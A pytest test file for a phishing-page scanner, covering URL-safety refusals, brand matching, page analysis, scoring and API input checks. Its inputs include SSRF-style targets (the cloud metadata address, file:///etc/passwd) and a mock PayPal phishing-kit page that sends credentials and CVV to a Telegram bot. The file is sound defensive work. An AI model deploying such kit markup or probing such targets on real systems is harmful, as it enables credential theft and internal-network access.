"""Offline tests for the scanner (src/phishdriftbench/scan/). Nothing here
touches the network: the fetcher's safety checks are exercised on
addresses that are refused before any connection, and the page analyser
and scorer run on fixed HTML."""
import pytest

from phishdriftbench.scan import brands, netsafe, page, score
from phishdriftbench.scan.score import Finding


# ---- netsafe ---------------------------------------------------------------------

@pytest.mark.parametrize("url", [
    "http://127.0.0.1/",
    "http://localhost/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.5/",
    "http://192.168.1.1/login",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://100.64.0.1/",
])
def test_private_targets_are_refused(url):
    with pytest.raises(netsafe.UnsafeTarget):
        netsafe.fetch(url)


@pytest.mark.parametrize("url", ["ftp://example.com/", "file:///etc/passwd", "http://example.com:22/"])
def test_non_web_targets_are_refused(url):
    with pytest.raises(netsafe.UnsafeTarget):
        netsafe.fetch(url)


def test_public_address_check():
    assert netsafe._is_public("8.8.8.8")
    assert not netsafe._is_public("172.16.0.1")
    assert not netsafe._is_public("::ffff:10.0.0.1")
    assert not netsafe._is_public("224.0.0.1")


# ---- brands ----------------------------------------------------------------------

def test_brand_ownership_includes_subdomains():
    assert brands.owner_of("login.microsoftonline.com") == "microsoft"
    assert brands.belongs_to("paypal", "www.paypal.com")
    assert not brands.belongs_to("paypal", "paypal.com.evil.tk")


def test_common_word_brands_need_a_strong_position():
    assert "apple" not in brands.mentions("an apple a day keeps the doctor away", strong=False)
    assert "apple" in brands.mentions("Apple ID - Sign in", strong=True)


# ---- page analysis ----------------------------------------------------------------

KIT = """<html><head><title>PayPal: Log in to your account</title>
<link rel="icon" href="https://www.paypalobjects.com/favicon.ico"></head><body>
<img src="/img/paypal-logo.svg" alt="PayPal">
<form action="https://api.telegram.org/bot123/sendMessage" method="post">
  <input name="email"><input type="password" name="pass"><input name="cvv">
</form>
<a href="https://www.paypal.com/privacy">Privacy</a><a href="https://www.paypal.com/legal">Legal</a>
<a href="#">Help</a><a href="#">Contact</a><a href="https://www.paypal.com/us/home">Home</a>
<script>document.oncontextmenu = function(){return false}; if(e.keyCode == 123) {}</script>
</body></html>"""

SHOP = """<html><head><title>Bricop: garden and DIY</title></head><body>
<p>Garden tools, paint and more for your home. Follow us on Instagram and WhatsApp.</p>
<img src="/icons/whatsapp.png" alt="WhatsApp"><img src="/icons/facebook.png" alt="Facebook">
<form action="/account/login" method="post"><input name="email"><input type="password" name="pw"></form>
<a href="/garden">Garden</a><a href="/paint">Paint</a></body></html>"""


def test_kit_page_is_read_for_what_it_is():
    pa = page.analyse(KIT, "https://secure-account-check.top/login")
    assert pa.has_password
    assert "paypal" in pa.brand_claims
    assert any(f.exfil == "api.telegram.org" for f in pa.forms)
    assert pa.favicon_domain == "paypalobjects.com"
    assert pa.anti_inspect
    assert pa.sensitive_fields


def test_social_icons_are_not_a_brand_claim():
    pa = page.analyse(SHOP, "https://bricop.ma/")
    assert pa.brand_claims == []
    assert pa.has_password


def test_provider_warning_page_is_recognised():
    html = "<html><head><title>Suspected Phishing | Cloudflare</title></head><body>Warning</body></html>"
    assert page.analyse(html, "https://x.pages.dev/").provider_flagged


def test_non_html_is_not_parsed():
    assert not page.analyse("%PDF-1.7 ...", "https://x.com/a.pdf", "application/pdf").is_html


# ---- scoring -----------------------------------------------------------------------

def test_no_evidence_is_safe_but_not_certain():
    s = score.combine([])
    assert s.verdict == "safe" and 10 <= s.risk <= 30


def test_confirmed_listing_overrides_everything():
    s = score.combine([Finding("known_site", "url", "x", "x", -3.5)], confirmed="OpenPhish")
    assert s.risk >= 97 and s.verdict == "phishing" and s.overridden_by == "OpenPhish"


def test_findings_are_ordered_by_severity():
    s = score.combine([Finding("a", "url", "a", "a", -1.0), Finding("b", "page", "b", "b", 4.0)])
    ids = [f["id"] for f in s.to_dict()["findings"]]
    assert ids == ["b", "a"]


# ---- API -------------------------------------------------------------------------

@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient

    from phishdriftbench.server import app
    return TestClient(app)


def test_health_lists_sources(client):
    body = client.get("/api/health").json()
    assert body["ok"] and "openphish" in body["sources"]


@pytest.mark.parametrize("url,fragment", [
    ("mailto:someone@example.com", "http and https"),
    ("not a url at all", "web address"),
    ("http://10.0.0.1/", "private or internal"),
])
def test_scan_rejects_what_it_must_not_scan(client, url, fragment):
    r = client.post("/api/scan", json={"url": url})
    assert r.status_code == 400 and fragment in r.json()["detail"]


def test_check_endpoint_is_offline_url_model(client):
    body = client.post("/api/check", json={"url": "https://xn--pple-43d.com"}).json()
    assert body["verdict"] == "PHISHING"
